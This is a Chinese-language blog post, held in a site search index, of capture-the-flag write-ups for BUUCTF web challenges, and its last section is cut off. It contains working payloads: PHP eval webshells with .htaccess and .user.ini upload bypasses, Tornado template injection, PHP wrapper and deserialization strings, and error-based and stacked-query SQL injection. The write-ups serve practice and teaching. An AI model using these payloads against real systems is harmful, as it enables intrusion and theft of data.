<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>buuctf_web</title>
    <link href="/2023/12/20/buuctf_web/"/>
    <url>/2023/12/20/buuctf_web/</url>
    
    <content type="html"><![CDATA[<h2 id="护网杯-2018-easy-tornado-1"><a href="#护网杯-2018-easy-tornado-1" class="headerlink" title="[护网杯 2018]easy_tornado 1"></a>[护网杯 2018]easy_tornado 1</h2><p>进入答题页面，发现三个超链接<br>分别点击进去<br>再点击进去后url中传输了两个参数，一个是filename，另一个是filehash，在第一个flag.txt中把filename改为提示的&#x2F;fllllllllllllag试试<br><img src="/images/0AYQ%25Q.png"><br>提交后页面显示error<br><img src="/images/0C.png"><br>看来拿到flag的关键就在于解出filehash是什么，根据第三个超链接的提示，应该是filehash&#x3D;md5(cookie_secret+md5(filename))，filename现已知，但cookie_secret是什么呢，而且第二个rander也没有用到，也并不清楚有什么用，只能去查一下tornado框架有什么特点了<br><a href="https://tornado-zh.readthedocs.io/zh/latest/">tornado框架的介绍</a><br><img src="/images/17dc88e290814aba95813a751925fb5f.png"></p><p>我们在这个文档里面可以知道cookie_secret并不像我们的cookie一样可以自己修改的(不是自己的cookie)，而是包含了时间戳，HMAC签名和编码后的cookie值，所以我们自己修改cookie并不现实。<br>想到render会不会是cookie_secret的突破点，找一下render作用</p><p>render意为渲染;self.render(“entry.html”,entry&#x3D;entry)该语句意思就是找到entry.html这个模板，用右边这个entry来实例化entry.html模板中的entry参数，从而显示在页面上。</p><p>回过头发现flag.txt那个Error的页面有一个参数msg也是等于Error<br><img src="/images/ZMS.png"><br>发现msg可以左右页面的输出，想到之前有些题目利用一个参数可以出来phpinfo()等，因此现在目标就是怎么利用msg这个参数来找到cookie_secret了<br><img src="/images/5334f6e91090438aaa0ac22c05c26768.png"><br>在文档中我们可以看到相关render渲染的作用，我们可以利用 <code>&#123;&#123;&#125;&#125;</code> 来把表达式传进去以获取我们想要的信息，这样我们猜想<code>msg=&#123;&#123;cookie的位置&#125;&#125;</code>来获得我们想要的<br><img src="/images/d2702883750b44daaabc93abd5f3255a.png"><br>cookie_secret在Application对象settings的属性中，访问它的话就需要知道它的属性名字，根据查阅可知：self.application.settings有一个别名是RequestHandler.settings其中handler又是指向处理当前这个页面的RequestHandler对象<br>RequestHandler.settings指向self.application.settings<br>因此handler.settings指向RequestHandler.application.settings<br><img src="/images/Q2I.png"><br>将handler.setting带入msg即可知道cookie_secret，再来一步步根据MD5来计算filehash</p><p><img src="/images/HQC2E6.png"><br>回到hints.txt<br>现在已经知道了cookie_secret的值，MD5(filename)就是&#x2F;fllllllllllllag的MD5的值<br>&#x3D;3bf9f6cf685a6dd8defadabfb41a03a1<br>把cookie_secret和MD5(filename)加起来再进行MD5加密即可得出flag<br><img src="/images/DJ.png"></p><h2 id="MRCTF2020-你传你🐎呢-1"><a href="#MRCTF2020-你传你🐎呢-1" class="headerlink" title="[MRCTF2020]你传你🐎呢 1"></a>[MRCTF2020]你传你🐎呢 1</h2><p>这题是个文件上传题，按照老方法先上传一个木马1.png 内容：<code>&lt;?php evel($_POST[&#39;a&#39;]);?&gt;</code><br>再上传一个.user.ini：内容为<code>auto_prepend_file=1.png</code> 上传之后他会给一个连接，进入&#x2F;upload之后的连接，用蚁剑连接也不能成功连接，也写不了命令，那么我们只有换一种方法了。</p><p>先上传一个1.png文件<br>内容为：<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>再上传一个.htaccess文件，<br>内容为：<code>SetHandler application/x-httpd-php</code></p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h3><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误界面、改变文件拓展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能<br>这里htaccess内容的意思是设置当前目录所有文件都使用php解析</p><p>这里要记得把Content-Type的内容修改一下<br><img src="/images/Y7CUL3CBL.png"><br>复制&#x2F;upload之后的url并进入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>:http://c59ecfdc-<span class="hljs-number">0</span>a3d-<span class="hljs-number">4</span>ed6-<span class="hljs-number">92</span>d7-<span class="hljs-number">74</span>b6bcc602d4.node4.buuoj.cn:<span class="hljs-number">81</span>/upload/<span class="hljs-number">7</span>a439cdf1a27a4860163c7641f0dc7fe/<span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><p>此时我们可以post输入命令</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>print_r(glob(<span class="hljs-string">&quot;/*&quot;</span>))<span class="hljs-comment">;</span><br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;/flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>以获取flag</p><p>或以当前url连接中国蚁剑，以获取flag</p><h2 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h2><p>打开之后是一段源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>一共有三个参数，都需要通过GET方式传入<br>isset的作用是检测变量是否已设置并且非null<br>file_get_contents的作用是将整个文件读入一个字符串<br>这里将text文件中读取字符串，还要和welcome to the zjctf相等<br>这里使用的是data:&#x2F;&#x2F;写入协议<br>payload：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-keyword">text</span>=data://<span class="hljs-keyword">text</span>/plain,welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br></code></pre></td></tr></table></figure><p><img src="/images/DKORO.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_match</span><span class="hljs-params">(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>)</span></span><br></code></pre></td></tr></table></figure><p>正则表达式，说明file不能出现flag字符<br>但是源码提示了useless.php这里使用php伪协议来读取文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=useless.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p><img src="/images/G3HD33.png"></p><p>使用base64解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>这里最后会echo输出file<br>将flag.php的值给了file，然后反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>使用php编译器phpstorm<br><img src="/images/TMK81DK.png"><br>payload:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;<br></code></pre></td></tr></table></figure><p>查看源码即可看到flag</p><h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h2><p>sql注入题，先试试万能密码username&#x3D;<code>1&#39; or 1=1#</code><br>password&#x3D;123<br><img src="/images/4RO.png"><br>经过一系列尝试后，发现空格，&#x3D;，union都被过滤了<br>空格被过滤我们使用()来代替空格&#x2F;**&#x2F;貌似也被过滤了<br>既然如此，尝试一下报错注入<br><strong>爆库</strong><br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=1</code></p><p><img src="/images/YKR.png"></p><p><strong>爆表</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#&amp;password=1</code></p><p><img src="/images/VNTXAGU.png"></p><p><strong>爆字段</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#&amp;password=1</code></p><p><img src="/images/16B3IU.png"></p><p><strong>爆值</strong><br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br><img src="/images/M3HJZ8NQ67JFV.png"><br>并没有成功显示flag，只显示了一半~<br>经过查询知道了right()可以查询后面的部分<br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br>和前面显示出的flag拼接删改得到完整的flag</p><h2 id="MRCTF2020-Ez-bypass-1"><a href="#MRCTF2020-Ez-bypass-1" class="headerlink" title="[MRCTF2020]Ez_bypass 1"></a>[MRCTF2020]Ez_bypass 1</h2><p>直接给出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;<br>Please input first<br><br></code></pre></td></tr></table></figure><p>发现第五个if可以获得flag<br>先第一个if<br><code>if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;]))</code><br>isset检查是否有效，随便输一个字符就能通过<br>第二个if<br><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code><br>绕过这个if要先想到MD5漏洞，我先想到的是0e开头的漏洞<br>ps:md5 值是 0e 开头，在 php 弱类型比较中判断为相等<br>再看回来，弱比较是&#x3D;&#x3D;，而本题中是&#x3D;&#x3D;&#x3D;强比较，所以不能用这个绕过<br>在查阅后发现还有一种方法——数组绕过<code>a[]=a&amp;b[]=b</code><br>虽然会报错，但判断为真，判断为null&#x3D;&#x3D;&#x3D;null<br>而且id!&#x3D;gg<br>payload:<code>?gg[]=gg&amp;id[]=id</code><br><img src="/images/XNP4L0FHEL.png"><br>You got the first steponly one way to get the flag</p><p>得到了我们需要的结果you got the first step<br>但多出来一句 only one way to get the flag<br>查看源代码发现是这一句是第三个if的else语句，说明第三个if并未绕过，<br><code>if(isset($_POST[&#39;passwd&#39;]))</code><br>同样随便post一个字符就能绕过</p><p>再看第四个if<br><code>if (!is_numeric($passwd))</code><br>is_numeric()函数是检测是否为数字字符，是则ture<br>这里为!is_numeric()，就是不能全为数字字符<br>同时我们看向第五个if<br><code>if($passwd==1234567)</code><br>与第四个if相反，要同时满足两个if条件才能获得flag<br>先试着把1234567转化为16进制<br>passwd&#x3D;12D687<br>提交后只绕过了第四个if，不行<br>百度一下发现<br><img src="/images/20210407185102246.png"><br>passwd:1234567%00<br>passwd:1234567%20<br>成功得到flag<br><img src="/images/CJBVJ1.png"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>进入页面，先查看源代码，发现源代码里有注释you are not admin<br>flag应该在admin中，看到右边有register和login，先随便注册一个看看什么效果<br>登录进去发现多了几个选项<br><img src="/images/GK.png"></p><p>挨个查看源代码<br><img src="/images/9DRO.png"><br>发现在change password中的源代码与其他不同，显示了一个github网址，进入查看网页竟然不存在，那就换一种方法，register注册一个admin，显示已被注册，那么我们试试直接login admin，密码随意，竟然成功了<br><img src="/images/9WKWG.png"><br>成功显示flag，后续会跟进其他方法</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>先上传一个.user.ini 内容为auto_prepend_file&#x3D;12.txt<br>上传失败，显示exif_imagetype:not image!，没有图像，那么我们使用文件幻术头绕过<br><img src="/images/1UZPE.png"><br>再次上传，成功<br><img src="/images/VT8D.png"><br>再上传一个常用的木马文件<br>上传错误，显示&lt;? in contents!<br>屏蔽了一些符号导致无法上传<br>换种方法上传<br><img src="/images/8BNM.png"><br>这次成功上传<br><img src="/images/G3.png"><br>进入给出的地址<br>先输入a&#x3D;phpinfo()试试能不能运行命令<br><img src="/images/P45UMTRF.png"><br>有回显，成功执行<br>继续post a&#x3D;system(“cat &#x2F;flag”)<br><img src="/images/U5SYBY1GKWV.png"><br>成功显示flag</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>上传.htaccess(以jpg形式抓包修改后缀名)<br><img src="/images/8HOSK.png"><br>上传一个木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>失败，过滤了&lt;?<br>换一种方式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传成功，蚁剑连接以找到flag</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>首先在靶机页面里他给了个github网址，进入在web&#x2F;babysqli&#x2F;html&#x2F;search.php里找到重要源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];<br><span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> echo <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>die(<span class="hljs-string">&quot;do not hack me!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;<br>printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-regexp">//</span> echo <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br><span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<br><span class="hljs-regexp">//</span> print_r(<span class="hljs-variable">$arr</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br><span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;<br>echo <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>die(<span class="hljs-string">&quot;wrong pass!&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>die(<span class="hljs-string">&quot;wrong user!&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输入万能钥匙1’ or 1&#x3D;1#显示do not hack me 与上面对应，限制了or</p><p>抓包<br><img src="/images/L64.png"><br>这里显示wrong user!<br>挨个试试1，2，3的位置，把它们改为’admin’，在2位置时回显发生了改变<br><img src="/images/N7R0.png"><br>wrong pass!<br>跳过了user，那么3的位置就是password了<br>注意到上面的代码if中有MD5，使if成立<br>设密码为abc，MD5加密后为：900150983cd24fb0d6963f7d28e17f72<br><img src="/images/Y276WNW.png"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>输入  <code>1&#39;;show tables;#</code><br><img src="/images/LG.png"><br>根据字面意思，flag应该在FlagHere里<br>输入  <code>1&#39;;cat FlagHere</code><br>没有显示</p><p>联合注入<br>输入  <code>1&#39;;select from FlagHere;#</code><br><img src="/images/IR6X2.png"><br>显示了被过滤掉的内容</p><p>尝试双写绕过<br><code>1&#39;;sselectelect from FlagHere</code><br>不通过</p><p>尝试大小写绕过<br><code>1&#39;;sElECt from FlagHere;#</code><br>同样不通过</p><h4 id="handler语法"><a href="#handler语法" class="headerlink" title="handler语法"></a>handler语法</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">handler</span>语句，一行一行的浏览一个表中的数据。<br><span class="hljs-keyword">handler</span>语句并不具备<span class="hljs-keyword">select</span>语句中的所有功能。<br>mysql专用的语句，并没有包含到<span class="hljs-keyword">sql</span>标准中。<br><span class="hljs-keyword">handler</span>语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表<br></code></pre></td></tr></table></figure><ol><li>HANDLER tbl_name OPEN<br>打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</li><li>HANDLER tbl_name READ FIRST<br>获取句柄的第一行，通过READ NEXT依次获取其它行，ui后一行执行之后再执行NEXT会返回一个空的结果。</li><li>HANDLER tbl_name 